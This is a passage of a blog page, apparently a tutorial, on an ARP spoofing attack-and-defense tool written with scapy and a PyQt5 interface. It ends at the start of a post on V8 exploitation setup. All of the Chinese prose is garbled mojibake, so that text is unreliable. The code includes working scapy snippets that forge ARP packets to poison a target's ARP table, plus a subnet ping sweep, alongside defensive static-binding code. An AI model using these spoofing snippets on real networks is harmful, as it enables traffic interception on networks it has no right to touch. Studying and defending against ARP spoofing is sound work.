      <p>ç›´æ¥å°†ç½‘å…³çœŸå®çš„MACåœ°å€å’Œå¯¹åº”IPè¿›è¡Œé™æ€ç»‘å®šå³å¯ã€‚è·å–ç½‘å…³çœŸå®MACåœ°å€ï¼Œå¯ä»¥ä½¿ç”¨getmacbyipå‡½æ•°ï¼Œè¯¥å‡½æ•°ä¼šå‘å±€åŸŸç½‘å†…å¹¿æ’­ï¼Œè¯¢é—®ç½‘å…³çœŸå®çš„MACçš„åœ°å€ï¼Œè€Œæ”»å‡»è€…é‚£é‡Œè‚¯å®šå­˜åœ¨çœŸå®çš„MACåœ°å€ï¼Œæ‰€ä»¥åŸºæœ¬ä¸€å®šèƒ½è·å¾—åˆ°çœŸå®çš„IPåœ°å€</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071205089.png" alt="image-20220307120520964"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(rep_detect_flag):</span><br><span class="line">    self.ui.defenseInfoText.appendPlainText(<span class="string">&quot;Defending against arp_rep attacks......&quot;</span>)</span><br><span class="line">    build_rep_defense()</span><br><span class="line">    p = subprocess.Popen([<span class="string">&quot;ip&quot;</span>, <span class="string">&quot;neigh&quot;</span>], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> p.stdout.readlines():</span><br><span class="line">        line_splitby_space = line.decode(<span class="string">&quot;utf-8&quot;</span>).strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;FAILED&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> line_splitby_space):</span><br><span class="line">            self.ui.defenseInfoText.appendPlainText(<span class="string">&#x27;&#123;:&lt;30s&#125;&#x27;</span>.<span class="built_in">format</span>(line_splitby_space[<span class="number">0</span>]) + <span class="string">&quot;\t&quot;</span> + line_splitby_space[<span class="number">4</span>])</span><br></pre></td></tr></table></div></figure>

<p>è¿™é‡Œæˆ‘ç›´æ¥ä¿®æ”¹æ‰€æœ‰çš„çš„IP_MACä¸ºé™æ€çš„</p>

        <h4 id="â‘¡reqæ¨¡å¼-1"   >
          <a href="#â‘¡reqæ¨¡å¼-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡reqæ¨¡å¼-1" class="headerlink" title="â‘¡reqæ¨¡å¼"></a>â‘¡reqæ¨¡å¼</h4>
      <p>ç”±äºæ˜¯ç½‘å…³è¢«æ¬ºéª—äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç½‘å…³å‘åŒ…ï¼Œä½¿å…¶å°†æˆ‘çš„IPå’ŒMACçœŸå®å†™å…¥ARPæ¬ºéª—ï¼Œä½†æ˜¯æ”»å‡»è€…å¯èƒ½ä¼šä¸€ç›´å‘åŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿéœ€è¦ä¸€ç›´å‘åŒ…æ‰èƒ½æ–­ç»­é˜²å¾¡æ”»å‡»ï¼Œä¸è¿‡è¿˜æ˜¯å¯èƒ½ä¼šä¸¢ä¸å°‘åŒ…ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_req_defense</span>():</span></span><br><span class="line">    <span class="keyword">global</span> gateway_ip</span><br><span class="line">    <span class="keyword">global</span> self_mac</span><br><span class="line">    self_ip = get_self_ip()</span><br><span class="line">    <span class="comment">#self_mac = get_if_hwaddr(netD_name)</span></span><br><span class="line">    gateway_mac = getmacbyip(gateway_ip)</span><br><span class="line">    <span class="comment">#Etherå¯¹åº”åŒ…çš„srcå’Œdst   ARPåªä¼šä¿®æ”¹å…¶ä¸­çš„ARPåŒ…ï¼Œå‘Šè¯‰dstï¼Œè¿™ä¸ªåŒ…çš„macæ˜¯hwsrcï¼Œipæ˜¯psrcï¼Œå‘ç»™hwdst/pdst</span></span><br><span class="line">    pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=self_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> pkt</span><br></pre></td></tr></table></div></figure>

<p>å¦‚ä¸Šè®¾ç½®åŒ…å†…å®¹ï¼Œå‘Šè¯‰ç½‘å…³æˆ‘æ‰æ˜¯çœŸçš„ã€‚</p>
<p>æˆ–è€…æœ‰ç½‘å…³æƒé™çš„ï¼Œç›´æ¥åœ¨ç½‘å…³çš„shellè¿›è¡Œé™æ€ç»‘å®šã€‚</p>

        <h1 id="äºŒã€pyQtç•Œé¢"   >
          <a href="#äºŒã€pyQtç•Œé¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€pyQtç•Œé¢" class="headerlink" title="äºŒã€pyQtç•Œé¢"></a>äºŒã€pyQtç•Œé¢</h1>
      
        <h2 id="1-ç¯å¢ƒæ­å»º"   >
          <a href="#1-ç¯å¢ƒæ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ç¯å¢ƒæ­å»º" class="headerlink" title="1.ç¯å¢ƒæ­å»º"></a>1.ç¯å¢ƒæ­å»º</h2>
      <p>ä¸»è¦é…åˆpycharmï¼Œå…ˆå®‰è£…pyQt5ï¼Œç„¶ååœ¨å¯¹åº”çš„åŒ…é‡Œå³å¯æ‰“å¼€</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip3 install PyQt5</span><br><span class="line">/home/hacker/.<span class="built_in">local</span>/lib/python3.6/site-packages/qt5_applications/Qt/bin/designer</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-é…åˆpycharm"   >
          <a href="#2-é…åˆpycharm" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-é…åˆpycharm" class="headerlink" title="2.é…åˆpycharm"></a>2.é…åˆpycharm</h2>
      <p>ä¸»è¦è®¾ç½®ä¸€ä¸‹å³å¯</p>
<p>File-&gt;setting-&gt;Tools-&gt;External Tools-&gt;+ä¸€ä¸‹å·¥å…·</p>

        <h3 id="Qt-Designer"   >
          <a href="#Qt-Designer" class="heading-link"><i class="fas fa-link"></i></a><a href="#Qt-Designer" class="headerlink" title="Qt_Designer"></a>Qt_Designer</h3>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121488.png" alt="image-20220307112101403"></p>
<p>ç›´æ¥ç‚¹å‡»å³å¯åŠ è½½</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071125687.png" alt="image-20220307112540614"></p>

        <h3 id="UIè½¬py"   >
          <a href="#UIè½¬py" class="heading-link"><i class="fas fa-link"></i></a><a href="#UIè½¬py" class="headerlink" title="UIè½¬py"></a>UIè½¬py</h3>
      <p>è½¬å®Œä¹‹åä¼šæ¯”è¾ƒèˆ’æœï¼Œå› ä¸ºåœ¨pycharmä¸­å¯ä»¥æç¤ºç›¸å…³çš„æ§ä»¶ï¼Œä½†æ˜¯ç›´æ¥loadåŠ è½½uiæ–‡ä»¶çš„è¯å°±æ²¡æœ‰æç¤ºã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071121263.png" alt="image-20220307112150183"></p>
<p>Argumentsçš„å‘½ä»¤å‚æ•°ä¸ºï¼š</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m PyQt5.uic.pyuic $FileName$ -o $FileNameWithoutExtension$.py</span><br></pre></td></tr></table></div></figure>

<p>ç›®å‰å¥½åƒpy-&gt;uiæ²¡åŠæ³•è½¬å›å»</p>
<p>ä¹‹åç‚¹å‡»è¦è½¬æ¢çš„uiæ–‡ä»¶ï¼Œç„¶åå¯¹åº”çš„æ‰“å¼€å·¥å…·å³å¯åœ¨å½“å‰æ–‡ä»¶å¤¹ä¸‹ç”Ÿæˆpyæ–‡ä»¶</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203071127006.png" alt="image-20220307112701929"></p>
<p>å¯¹åº”å°±ä¼šç”Ÿæˆ<code>window.py</code>æ–‡ä»¶</p>

        <h2 id="3-ç•Œé¢å¯åŠ¨"   >
          <a href="#3-ç•Œé¢å¯åŠ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ç•Œé¢å¯åŠ¨" class="headerlink" title="3.ç•Œé¢å¯åŠ¨"></a>3.ç•Œé¢å¯åŠ¨</h2>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainWindow</span>(<span class="params">QMainWindow</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        <span class="comment">#å¯¼å…¥ui</span></span><br><span class="line">        self.ui = Ui_MainWindow()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = QApplication([])</span><br><span class="line">    myWindow = MainWindow()</span><br><span class="line">    myWindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></div></figure>


        <h2 id="4-ç•Œé¢é€€å‡º"   >
          <a href="#4-ç•Œé¢é€€å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-ç•Œé¢é€€å‡º" class="headerlink" title="4.ç•Œé¢é€€å‡º"></a>4.ç•Œé¢é€€å‡º</h2>
      <p>ä¸€èˆ¬ç•Œé¢éƒ½æ˜¯å¤šçº¿ç¨‹çš„ï¼Œæ‰€ä»¥é€€å‡ºçš„æ—¶å€™ä¸€èˆ¬éœ€è¦åŠ ä¸Šä¸€äº›ä¸œè¥¿å°†ä¸€äº›çº¿ç¨‹ç»™å…³é—­ï¼Œå®‰å…¨é€€å‡ºï¼Œæ‰€ä»¥éœ€è¦é‡å†™ä¸€ä¸‹çª—å£å…³é—­çš„closeEventå‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">closeEvent</span>(<span class="params">self, event</span>):</span></span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> threads_flag_dictionary.keys():</span><br><span class="line">        threads_flag_dictionary[key].<span class="built_in">set</span>()<span class="comment">#ç›¸å…³çº¿ç¨‹ç»ˆæ­¢flagè®¾ç½®</span></span><br><span class="line">    event.accept()</span><br><span class="line">    os._exit(<span class="number">0</span>)</span><br></pre></td></tr></table></div></figure>




        <h1 id="ä¸‰ã€åˆ©ç”¨å‡½æ•°è¯¦è§£"   >
          <a href="#ä¸‰ã€åˆ©ç”¨å‡½æ•°è¯¦è§£" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€åˆ©ç”¨å‡½æ•°è¯¦è§£" class="headerlink" title="ä¸‰ã€åˆ©ç”¨å‡½æ•°è¯¦è§£"></a>ä¸‰ã€åˆ©ç”¨å‡½æ•°è¯¦è§£</h1>
      
        <h2 id="1-å‘åŒ…å‡½æ•°"   >
          <a href="#1-å‘åŒ…å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-å‘åŒ…å‡½æ•°" class="headerlink" title="1.å‘åŒ…å‡½æ•°"></a>1.å‘åŒ…å‡½æ•°</h2>
      
        <h3 id="1-Ether"   >
          <a href="#1-Ether" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-Ether" class="headerlink" title="(1)Ether"></a>(1)Ether</h3>
      <p>ä¸»è¦å°±æ˜¯ä½¿ç”¨Etheråˆ›å»ºä¸€ä¸ªMACæ•°æ®å¸§å¤´ï¼Œå³æºMACåœ°å€ï¼Œè¦å‘å¾€çš„MACåœ°å€ï¼Œè¿™ä¸ªä¸èƒ½æ›´æ”¹ï¼Œç”¨æ¥åœ¨å±€åŸŸç½‘ä¸­è®¾ç½®å‘å¾€çš„åœ°æ–¹ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ether(src=self_mac, dst=gateway_mac)</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-ARP"   >
          <a href="#2-ARP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ARP" class="headerlink" title="(2)ARP"></a>(2)ARP</h3>
      <p>è¿™ä¸ªå°±æ˜¯ç”¨æ¥ä¼ªé€ æ•°æ®åŒ…ä¸­çš„ARPæ•°æ®ï¼Œå¯ä»¥éšä¾¿æ”¹ï¼Œç›®æ ‡ä¸»æœºæ¥æ”¶åˆ°è¯¥æ•°æ®åŒ…çš„æ—¶å€™ï¼Œä¼šåˆ¤æ–­æ˜¯å¦å’Œæœ¬æœºçš„ARPè¡¨æ˜¯å¦ç›¸åŒï¼Œä¸åŒåˆ™ä¼šä¾æ®è¯¥ARPåŒ…æ¥è¿›è¡Œä¿®æ”¹ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>

<p>ARPæ¬ºéª—ä¸»è¦å°±æ˜¯ä¿®æ”¹<code>hwsrc/psrc</code>ï¼Œä½¿å¾—ç›®æ ‡ä¸»æœºçš„ARPè¡¨ä¾æ®è¯¥<code>hwsrc/psrc</code>æ¥å¯¹è‡ªå·±çš„ARPè¡¨è¿›è¡Œå†™å…¥ã€‚æ¯”å¦‚è¿™é‡Œå°±æ˜¯ä½¿å¾—ç›®æ ‡ä¸»æœºä¸­çš„ARPè¡¨ç”±åŸæœ¬æ­£ç¡®çš„<code>target_ip---target_MAC</code>å˜ä¸º<code>target_ip---self_mac</code></p>

        <h3 id="3-å®é™…å‘åŒ…"   >
          <a href="#3-å®é™…å‘åŒ…" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å®é™…å‘åŒ…" class="headerlink" title="(3)å®é™…å‘åŒ…"></a>(3)å®é™…å‘åŒ…</h3>
      <p>éœ€è¦å°†Etherå’ŒARPç»“åˆèµ·æ¥ç»„æˆä¸€ä¸ªMACå¸§pktï¼Œç„¶åå°±å¯ä»¥å°†è¯¥MACå¸§å‘å¾€ç½‘å¡<code>network driver</code></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pkt = Ether(src=self_mac, dst=gateway_mac) / ARP(hwsrc=self_mac, psrc=target_ip, hwdst=gateway_mac, pdst = gateway_ip,op=<span class="number">1</span>)</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘ send"   >
          <a href="#â‘ send" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘ send" class="headerlink" title="â‘ send"></a>â‘ send</h4>
      <p>å·¥ä½œåœ¨ç¬¬ä¸‰å±‚ç½‘ç»œå±‚ï¼Œå‘é€IPæ•°æ®åŒ…ï¼ŒåŒ…å¤´éœ€è¦æ˜¯IPæ•°æ®åŒ…å¤´</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send(IP(dst=<span class="string">&quot;192.168.1.107&quot;</span>)/ICMP())</span><br></pre></td></tr></table></div></figure>


        <h4 id="â‘¡sendp"   >
          <a href="#â‘¡sendp" class="heading-link"><i class="fas fa-link"></i></a><a href="#â‘¡sendp" class="headerlink" title="â‘¡sendp"></a>â‘¡sendp</h4>
      <p>å·¥ä½œåœ¨ç¬¬äºŒå±‚é“¾è·¯å±‚ï¼Œå‘é€MACå¸§ï¼ŒåŒ…å¤´éœ€è¦æ˜¯MACå¸§å¤´ï¼Œå³Ether</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendp(pkt, inter=<span class="number">2</span>, iface=netD_name)</span><br><span class="line"><span class="comment">#è¿™é‡Œpktå°±æ˜¯åŒ…ï¼Œå³Ether()/ARP()ä¹‹ç±»çš„</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-çº¿ç¨‹å‡½æ•°"   >
          <a href="#2-çº¿ç¨‹å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-çº¿ç¨‹å‡½æ•°" class="headerlink" title="2.çº¿ç¨‹å‡½æ•°"></a>2.çº¿ç¨‹å‡½æ•°</h2>
      <p>ä½¿ç”¨pyQtçº¿ç¨‹å‡½æ•°ï¼Œä¸€èˆ¬ä¸¤ç§æ–¹æ³•ï¼Œæ¯”è¾ƒå–œæ¬¢ç”¨threadingçš„</p>

        <h3 id="1-çº¿ç¨‹å¯åŠ¨"   >
          <a href="#1-çº¿ç¨‹å¯åŠ¨" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-çº¿ç¨‹å¯åŠ¨" class="headerlink" title="(1)çº¿ç¨‹å¯åŠ¨"></a>(1)çº¿ç¨‹å¯åŠ¨</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è®¾ç½®ç»ˆæ­¢ä¿¡å·ï¼Œé˜²æ­¢çº¿ç¨‹ä¸€ç›´è¿è¡Œä¸åœæ­¢</span></span><br><span class="line">send_thread_defense_stop_flag = threading.Event()</span><br><span class="line"><span class="comment">#çº¿ç¨‹åˆ›å»ºï¼Œå¯¹åº”self.send_packå‡½æ•°ï¼Œå‚æ•°ä¸ºargs=(xxx,xxx,xxx)</span></span><br><span class="line">send_thread = threading.Thread(target=self.send_pack, args=(pkt,send_thread_defense_stop_flag,<span class="string">&quot;defense&quot;</span>))</span><br><span class="line"><span class="comment">#çº¿ç¨‹å¯åŠ¨</span></span><br><span class="line">send_thread.start()</span><br><span class="line"><span class="comment">#å°†ç»ˆæ­¢ä¿¡å·æ·»åŠ è¿›å­—å…¸è¿›è¡Œç®¡ç†</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>] = send_thread_defense_stop_flag</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-çº¿ç¨‹é˜»å¡"   >
          <a href="#2-çº¿ç¨‹é˜»å¡" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-çº¿ç¨‹é˜»å¡" class="headerlink" title="(2)çº¿ç¨‹é˜»å¡"></a>(2)çº¿ç¨‹é˜»å¡</h3>
      <p>æœ‰æ—¶å€™éœ€è¦çº¿ç¨‹é˜»å¡ï¼Œå³å®Œæˆè¯¥çº¿ç¨‹æ‰è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œé‚£ä¹ˆå°±éœ€è¦ç”¨åˆ°joinå‡½æ•°</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç”¨åœ¨send_thread.start()ä¹‹å</span></span><br><span class="line">send_thread.join()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-çº¿ç¨‹ç»ˆæ­¢"   >
          <a href="#3-çº¿ç¨‹ç»ˆæ­¢" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-çº¿ç¨‹ç»ˆæ­¢" class="headerlink" title="(3)çº¿ç¨‹ç»ˆæ­¢"></a>(3)çº¿ç¨‹ç»ˆæ­¢</h3>
      <p>å³ä¹‹å‰æåˆ°çš„è®¾ç½®å¯¹åº”çš„ç»ˆæ­¢flag</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è§¦å‘åœæ­¢ä¿¡å·</span></span><br><span class="line">threads_flag_dictionary[<span class="string">&#x27;send_defense_thread&#x27;</span>].<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">#send_packå‡½æ•°ä¸­æŸäº›éœ€è¦ä¸€ç›´è¿è¡Œçš„ä»£ç å—ä¸­</span></span><br><span class="line"><span class="keyword">while</span> (stop_flag.is_set()):</span><br><span class="line">	<span class="keyword">pass</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="3-å…¶ä»–åŠŸèƒ½æ€§å‡½æ•°"   >
          <a href="#3-å…¶ä»–åŠŸèƒ½æ€§å‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-å…¶ä»–åŠŸèƒ½æ€§å‡½æ•°" class="headerlink" title="3.å…¶ä»–åŠŸèƒ½æ€§å‡½æ•°"></a>3.å…¶ä»–åŠŸèƒ½æ€§å‡½æ•°</h2>
      
        <h3 id="1-è·å–å­˜æ´»ä¸»æœºå‡½æ•°"   >
          <a href="#1-è·å–å­˜æ´»ä¸»æœºå‡½æ•°" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-è·å–å­˜æ´»ä¸»æœºå‡½æ•°" class="headerlink" title="(1)è·å–å­˜æ´»ä¸»æœºå‡½æ•°"></a>(1)è·å–å­˜æ´»ä¸»æœºå‡½æ•°</h3>
      <p>ç”±äº<code>ip neigh</code>å‘½ä»¤ä¼šä»ä¸€ä¸ªå­˜æ´»ä¸»æœºçš„ç¼“å†²åŒºä¸­è·å–ç›¸å…³çš„ä¸»æœºï¼Œä½†æ˜¯å®é™…ä¸Šå¦‚æœæ–°åŠ å…¥ä¸€ä¸ªä¸»æœºï¼Œåˆ™ä¸ä¼šæ˜¾ç¤ºå‡ºæ¥ï¼Œé™¤éæ¥æ”¶åˆ°è¯¥ä¸»æœºçš„åŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¸»åŠ¨å»pingä»–ä»¬ï¼Œçœ‹ä»–ä»¬æ˜¯å¦å­˜æ´»ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ip_prefix = <span class="string">&#x27;.&#x27;</span>.join(gateway_ip.split(<span class="string">&#x27;.&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">threads = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">256</span>):</span><br><span class="line">    ip = <span class="string">&#x27;%s.%s&#x27;</span> % (ip_prefix, i)</span><br><span class="line">    threads.append(threading.Thread(target=ping_ip, args=&#123;ip, &#125;))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.start()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">    i.join()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping_ip</span>(<span class="params">ip_str</span>):</span></span><br><span class="line">    cmd = [<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c&quot;</span>,<span class="string">&quot;1&quot;</span>, ip_str]</span><br><span class="line">    output = os.popen(<span class="string">&quot; &quot;</span>.join(cmd)).readlines()</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> output:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(line).upper().find(<span class="string">&quot;TTL&quot;</span>) &gt;= <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;ip: %s åœ¨çº¿&quot;</span> % ip_str)</span><br></pre></td></tr></table></div></figure>


        <h3 id="2-è·å–æœ¬IP"   >
          <a href="#2-è·å–æœ¬IP" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-è·å–æœ¬IP" class="headerlink" title="(2)è·å–æœ¬IP"></a>(2)è·å–æœ¬IP</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_self_ip</span>():</span></span><br><span class="line">    <span class="keyword">global</span> netD_name</span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">    <span class="keyword">return</span> socket.inet_ntoa(fcntl.ioctl(s.fileno(), <span class="number">0x8915</span>, struct.pack(<span class="string">&#x27;256s&#x27;</span>, <span class="built_in">bytes</span>(netD_name[:<span class="number">15</span>],<span class="string">&#x27;utf-8&#x27;</span>)))[<span class="number">20</span>:<span class="number">24</span>])</span><br><span class="line">self_ip = get_self_ip()</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-ä»stdoutè·å–è¾“å‡º"   >
          <a href="#3-ä»stdoutè·å–è¾“å‡º" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-ä»stdoutè·å–è¾“å‡º" class="headerlink" title="(3)ä»stdoutè·å–è¾“å‡º"></a>(3)ä»stdoutè·å–è¾“å‡º</h3>
      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_conten_from_stdout</span>(<span class="params">self,func</span>):</span></span><br><span class="line">    sys.stdout = string_io = StringIO()</span><br><span class="line">    func()</span><br><span class="line">    sys.stdout = self._stdout</span><br><span class="line">    print_str = string_io.getvalue()</span><br><span class="line">    <span class="keyword">del</span> string_io</span><br><span class="line">    <span class="keyword">return</span> print_str</span><br><span class="line"></span><br><span class="line">print_str = self.get_conten_from_stdout(pkt.show)</span><br></pre></td></tr></table></div></figure>

</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/01/V8%E4%BB%8E0%E5%BC%80%E5%A7%8B/">V8ä»0å¼€å§‹</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-22</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€ç¯å¢ƒæ­å»º"   >
          <a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€ç¯å¢ƒæ­å»º" class="headerlink" title="ä¸€ã€ç¯å¢ƒæ­å»º"></a>ä¸€ã€ç¯å¢ƒæ­å»º</h1>
      <p>å‚ç…§[<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-268933.htm#msg_header_h1_5" >åŸåˆ›]v8åˆ©ç”¨åˆæ¢ 2019 StarCTF oob å¤ç°åˆ†æ-Pwn-çœ‹é›ªè®ºå›-å®‰å…¨ç¤¾åŒº|å®‰å…¨æ‹›è˜|bbs.pediy.com</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h2 id="1-ä»£ç†è®¾ç½®"   >
          <a href="#1-ä»£ç†è®¾ç½®" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-ä»£ç†è®¾ç½®" class="headerlink" title="1.ä»£ç†è®¾ç½®"></a>1.ä»£ç†è®¾ç½®</h2>
      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global http.proxy http://ip:port</span><br><span class="line"><span class="built_in">export</span> &#123;http,https&#125;_proxy=<span class="string">&quot;http://ip:port&quot;</span></span><br></pre></td></tr></table></div></figure>


        <h2 id="2-ä»£ç ä¸‹è½½"   >
